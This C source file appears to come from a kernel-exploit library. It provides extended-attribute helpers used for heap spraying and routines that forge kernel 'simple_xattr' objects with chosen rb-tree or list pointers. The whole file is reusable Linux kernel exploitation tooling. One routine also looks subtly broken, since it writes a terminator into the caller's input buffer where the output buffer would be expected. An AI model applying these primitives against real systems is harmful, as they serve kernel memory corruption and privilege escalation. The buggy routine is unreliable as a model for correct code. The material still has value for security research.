// https://github.com/qwerty-po/kernel_exploit_modules/xattr.c

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/xattr.h>

#include "xattr.h"
#include "helper.h"

char *gen_xattr_name(char *prefix, char *name)
{
    assert(prefix[strlen(prefix) - 1] == '.');
    char *xattr_name = (char *)calloc(strlen(prefix) + strlen(name) + 1, 1);
    strcpy(xattr_name, prefix);
    strcat(xattr_name, name);
    return xattr_name;
}

char *gen_xattr_name_fixed_sz(char *prefix, char *name, size_t sz)
{
    assert(prefix[strlen(prefix) - 1] == '.');
    char *xattr_name = (char *)calloc(strlen(prefix) + strlen(name) + sz, 1);
    strcpy(xattr_name, prefix);
    strcat(xattr_name, name);
    memset(xattr_name + strlen(xattr_name), 'A', sz - 1 - strlen(xattr_name));
    name[sz-1] = '\0';
    return xattr_name;
}

int create_xattr(char *fname, char *name, char *value, uint64_t objectsz, bool panic_on_warn)
{
    int err = 0;
    if((err = setxattr(fname, name, value, objectsz, 0)) < 0)
    {
        if(panic_on_warn)
            panic("setxattr");
        else
            perror("setxattr");
    }
    
    return err;
}

struct xattr_return *read_xattr(char *fname, char *name)
{
    struct xattr_return *ret = (struct xattr_return *)calloc(sizeof(struct xattr_return), 1);

    ret->value = (char *)calloc(0x10000, 1);
    if((ret->size = getxattr(fname, name, ret->value, 0x10000)) < 0)
        perror("getxattr");
    return ret;
}

int remove_xattr(char *fname, char *name, bool panic_on_warn)
{
    int err = 0;
    if((err = removexattr(fname, name)) < 0)
    {
        if(panic_on_warn)
            panic("removexattr");
        else
            perror("removexattr");
    }
    return err;
}

void remove_xattr_noerror(char *fname, char *name)
{
    removexattr(fname, name);
}

#if MODULES_CONFIG_IS_XATTR_RBTREE
struct simple_xattr *fake_xattr(bool color, struct rb_node *parent, struct rb_node *right, struct rb_node *left, char *name, size_t size, char *value, uint64_t valuesz)
{
    struct simple_xattr *xattr = (struct simple_xattr *)calloc(sizeof(struct simple_xattr) + valuesz, 1);
    xattr->rb_node.__rb_parent_color = (uint64_t)parent | color;
    xattr->rb_node.rb_right = right;
    xattr->rb_node.rb_left = left;
    xattr->name = name;
    xattr->size = size;
    memcpy(xattr->value, value, valuesz);

    return xattr;
}
#else
struct simple_xattr *fake_xattr(struct list_head *next, struct list_head *prev, char *name, size_t size, char *value, uint64_t valuesz)
{
    struct simple_xattr *xattr = (struct simple_xattr *)calloc(sizeof(struct simple_xattr) + valuesz, 1);
    xattr->list.next = next;
    xattr->list.prev = prev;
    xattr->name = name;
    xattr->size = size;
    memcpy(xattr->value, value, valuesz);

    return xattr;
}
#endif